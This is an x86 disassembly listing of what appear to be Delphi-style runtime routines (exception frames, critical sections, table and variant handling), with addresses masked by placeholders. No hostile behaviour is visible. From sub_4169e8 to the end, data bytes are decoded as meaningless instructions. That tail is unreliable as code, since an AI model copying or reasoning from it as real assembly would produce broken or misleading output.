retn
sub_415b2c
call eax
out 0x40 al
add [ eax ] cl
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add al 0x0
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_41670c
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_41602c
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_415b3c
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_415b9d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_4051c8
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415ba4
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403390
sub_415bec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_41602c
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_41670c
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_415c40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_415c78
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_41602c
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_415cb4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov cx [ rw-data ]
xor edx edx
mov eax esi
call sub_415cf8
inc [ rw-data ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_415cf8
push ebp
mov ebp esp
add esp 0xfffffec0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x140 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x8 ] cx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415f55
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403360
push rw-data
call EnterCriticalSection
xor ecx ecx
push ebp
push sub_415f28
push [ fs : ecx ]
mov [ fs : ecx ] esp
movzx ebx [ ebp - 0x8 ]
sub ebx 0x100
test ebx ebx
jl r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
call sub_403b5c
cmp [ ebp - 0x8 ] 0x10f
jae r-xdata
mov eax [ rw-data ]
mov eax [ eax + ebx * 4 ]
test eax eax
je r-xdata
mov eax ebx
mov ecx 0xf
cdq
idiv ecx
inc eax
mov edi eax
shl edi 0x4
sub edi eax
cmp edi 0x7ff
jle r-xdata
mov eax [ rw-data ]
call sub_4051c8
mov esi eax
cmp esi ebx
jg r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + ebx * 4 ] edx
mov eax [ ebp - 0x4 ]
mov dx [ ebp - 0x8 ]
mov [ eax + 0x4 ] dx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415f2f
push rw-data
call LeaveCriticalSection
retn
cmp eax [ rw-data ]
jne r-xdata
push edi
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405384
add esp 0x4
mov edx esi
push edx
mov eax [ rw-data ]
call sub_4051c8
dec eax
pop edx
sub eax edx
jl r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] 0xb
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + ebx * 4 ]
mov eax [ eax ]
lea edx [ ebp - 0x13c ]
call sub_4032e0
lea eax [ ebp - 0x13c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0x4
lea eax [ ebp - 0x3c ]
push eax
push 0x2
lea edx [ ebp - 0x140 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x140 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
call sub_403b5c
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x24 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
call sub_403b5c
jmp r-xdata
inc eax
mov ecx [ rw-data ]
xor esi esi
mov [ ecx + edx * 4 ] esi
inc edx
dec eax
jne r-xdata
sub_415f5c
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_415f80
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40375c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_415fe3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415fea
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_4160d4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403444
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_416178
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_416421
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov al [ eax + ebx + 0x3 ]
mov edx eax
and dl 0x7f
mov esi edx
and esi 0xff
mov edx [ ebp + 0x8 ]
test al 0x80
setne al
cmp esi 0xa
jne r-xdata
cmp esi 0x48
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
lea eax [ edx + eax * 8 ]
call sub_414dc0
jmp r-xdata
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0xc ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x8 ]
lea esi [ ecx + edx * 8 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416428
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404144
retn
cmp esi 0xc
jne r-xdata
cmp esi 0xc
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404640
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404978
xor eax eax
mov [ esi + 0x4 ] eax
mov edi ebx
add edi edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + edi * 8 ] 0x8
mov eax [ esi ]
call sub_404988
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + edi * 8 + 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov eax [ eax ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404640
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404978
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov [ esi + 0x4 ] eax
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + eax * 8 ] 0x4008
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx esi
mov [ edx + eax * 8 + 0x8 ] ecx
jmp r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + eax * 8 ] si
lea edx [ esi + esi * 2 ]
mov ecx [ rw-data ]
mov edx [ ecx + edx * 4 + 0x4 ]
dec edx
sub edx 0x2
jb r-xdata
mov eax [ ebp + 0x8 ]
mov edi [ eax - 0x10 ]
cmp [ edi ] 0x100
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
or si 0x4000
mov [ edx + eax * 8 ] si
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx ]
mov [ edx + eax * 8 + 0x8 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
cmp [ eax ] 0x100
jne r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx ]
mov [ edx + eax * 8 + 0x8 ] ecx
jmp r-xdata
dec edx
je r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi edi
lea edi [ edx + eax * 8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0xc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
lea esi [ edx + eax * 8 ]
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404640
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404978
xor eax eax
mov [ esi + 0x4 ] eax
mov edi ebx
add edi edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + edi * 8 ] 0x8
mov eax [ esi ]
call sub_404988
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + edi * 8 + 0x8 ] eax
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
jmp r-xdata
push 0x8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov ecx eax
mov edx [ ebp + 0x8 ]
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_41607c
sub edx 0x4
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx ]
mov [ edx + eax * 8 + 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + eax * 8 + 0xc ] ecx
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0x4
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_41603c
sub_416430
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4166cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
movzx eax [ eax + 0x1 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x38 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x20 ]
lea edx [ edx + ecx + 0x3 ]
call sub_404318
mov edx [ ebp - 0x38 ]
lea ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405384
add esp 0x4
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405384
add esp 0x4
mov esi [ ebp - 0x20 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
mov al [ eax ]
dec al
je r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
dec al
je r-xdata
push ebp
mov eax ebx
call sub_416178
pop ecx
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x44 ]
test al al
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
test al al
jne r-xdata
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x1c ]
mov ebx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x48 ]
test al al
jne r-xdata
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x14 ]
call sub_416060
xor eax eax
push ebp
push sub_41657b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
call sub_414dc0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_41603c
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_41603c
jmp r-xdata
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4166d3
lea eax [ ebp - 0x3c ]
call sub_40482c
lea eax [ ebp - 0x38 ]
call sub_404120
lea eax [ ebp - 0x24 ]
call sub_404120
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4054a4
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4054a4
retn
dec ebx
mov eax [ ebp - 0x8 ]
lea esi [ eax + ebx * 8 ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x14 ]
call sub_416068
retn
mov eax [ ebp - 0x14 ]
call sub_41603c
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x48 ]
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_41603c
jmp r-xdata
cmp [ ebp - 0x20 ] 0x1
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_41603c
mov eax [ ebp - 0x14 ]
call sub_41603c
jmp r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov eax [ esi ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404a28
mov edx [ ebp - 0x3c ]
mov eax [ esi + 0x4 ]
call sub_4043a8
mov eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x4c ]
test al al
jne r-xdata
sub_41670c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4167b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_4051c8
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_4167c4
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41689a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41687d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_4051d0
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416884
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_4032e0
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_404384
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_408224
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_4168c4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_416933
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41693a
retn
call sub_415b3c
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_4054a4
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404bd4
mov eax rw-data
call sub_404120
mov eax rw-data
call sub_40f638
sub_41693c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4169dd
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4169e4
retn
mov eax rw-data
call sub_414dc0
mov eax sub_40f338
mov [ rw-data ] eax
mov eax sub_40ee88
mov [ rw-data ] eax
mov edx sub_40ed98
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40f638
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_4148b8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f94c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412bb4
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_4132dc
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_4169e8
push 0x93004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi + edi * 8 + 0x76680000 ] dl
dec eax
add [ ebp + 0x680000ff ] dl
jbe r-xdata
add [ edi + 0x680000ff ] bl
jbe r-xdata
add [ esi + 0x680000ff ] dl
jbe r-xdata
add [ ecx + 0x680000ff ] cl
jbe r-xdata
add [ eax + 0x680000ff ] al
jbe r-xdata
add [ edi + 0x680000ff ] dl
jbe r-xdata
xor eax eax
push ebp
push r-xdata
add [ edx + 0x680000ff ] cl
jbe r-xdata
add [ ecx + 0x680000ff ] al
jbe r-xdata
add [ eax + 0x680000ff ] bl
jbe r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
add [ ebx + 0x680000ff ] cl
jbe r-xdata
add [ edx + 0x680000ff ] al
jbe r-xdata
add [ ecx + 0x680000ff ] bl
jbe r-xdata
inc eax
js r-xdata
add [ edi + edi * 8 + 0x76680000 ] cl
dec eax
add [ ebx + 0x680000ff ] al
jbe r-xdata
add [ edx + 0x680000ff ] bl
jbe r-xdata
inc esp
and al 0x4
mov [ fs : eax ] edx
push r-xdata
retn
add [ ebx ] dh
rcr [ edx + 0x59 ] 0x59
add bl al
jmp sub_403b24
add [ esi + 0x680000ff ] cl
jbe r-xdata
add [ ebp + 0x680000ff ] cl
jbe r-xdata
add [ edi + edi * 8 + 0x76680000 ] al
dec eax
add [ ebx + 0x680000ff ] bl
jbe r-xdata
clc
pop ebp
retn
add [ edi + 0x680000ff ] cl
jbe r-xdata
add [ esi + 0x680000ff ] al
jbe r-xdata
add [ ebp + 0x680000ff ] al
jbe r-xdata
add [ edi + edi * 8 + 0x76680000 ] bl
dec eax
add [ ebp + 0x680000ff ] bl
jbe r-xdata
js r-xdata
add [ eax - 0x1 ] dh
add [ eax ] al
push 0x71004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi + 0x680000ff ] al
jbe r-xdata
add [ esi + 0x680000ff ] bl
jbe r-xdata
add ch [ eax + 0x17 ]
pop esp
mov [ edi ] edi
lea eax [ edx - 0x7b ]
push cs
lahf
push esp
cmc
or al 0x22
xchg ebx eax
push ecx
imul eax [ ecx ] 0x10
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x6bd00040 ] cl
inc ecx
add [ ecx + 0x6b ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 2 ] ah
inc ecx
add [ eax + eax ] dl
add [ eax ] al
shl bh 0x40
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax - 0x2bffbea1 ] al
pushad
inc ecx
add [ eax ] dl
pushad
inc ecx
add [ eax + 0x41 ] al
add [ eax ] ah
inc ecx
add [ eax ] dh
inc ecx
add [ eax ] cl
inc ecx
add [ ebx + ebx * 2 + 0x5bec0041 ] dh
inc ecx
add [ eax + 0x5c ] bh
inc ecx
add [ eax - 0x6fffbfd5 ] dl
sub eax [ eax ]
test al 0x5b
inc ecx
add [ eax + 0x60 ] bl
inc ecx
add [ eax + 0x5c ] al
inc ecx
add [ esp + ebx * 2 ] dh
inc ecx
add [ ecx ] bl
inc ecx
add ah dh
inc cx
add [ eax ] al
inc ecx
add [ eax ] dh
jae r-xdata
add [ ecx ] al
retn
add [ ecx - 0x1 ] dh
add [ eax ] al
push 0x72004876
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
add [ eax + 0x680000ff ] cl
jbe r-xdata
mov [ ecx + eax * 2 ] ch
or al 0x0
add [ eax ] al
nop
je r-xdata
add [ eax - 0x6fffbe8d ] ah
sub eax [ eax ]
pop ss
push esp
push eax
jne r-xdata
add [ edx - 0x1 ] dh
add [ eax ] al
push ebp
mov ebp esp
add [ eax ] al
add [ eax ] al
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xe004033 ] al
jb r-xdata
insb
imul esi [ ebx + 0x68 ] 0x656c6261
add [ esi + 0x61 ] al
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
jo r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
nop
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x6c
popad
outsb
je r-xdata
add [ edx + 0x5e ] bl
add [ eax ] al
add bh bh
pop ebx
retn
or al 0x24
mov esi edx
mov ebx eax
mov eax ebx
call sub_4032d8
mov ecx [ esp ]
mov edx esi
jo r-xdata
je r-xdata
jb r-xdata
jns r-xdata
pop ecx
pop edx
pop ebx
retn
jb r-xdata
rcr [ edx + 0x48 ] 0x1
add [ edx + 0x6c3ca101 ] dh
inc ecx
add al ch
int1
dec edi
jb r-xdata
insb
popad
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
insb
mov [ gs : ecx + eax * 2 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae sub_416d28
jns r-xdata
call sub_416d74
pop edx
pop esi
outsd
jb r-xdata
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x15004033 ] al
inc ebp
push eax
jb r-xdata
sub [ ebx ] dh
jb r-xdata
inc esp
and al 0x4
or edx [ edx + ebp * 2 ]
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
outsd
outsb
jbe r-xdata
inc ebp
push eax
inc eax
add [ esi ] cl
sar bh 0xff
jae r-xdata
outsd
jb r-xdata
jb r-xdata
push esi
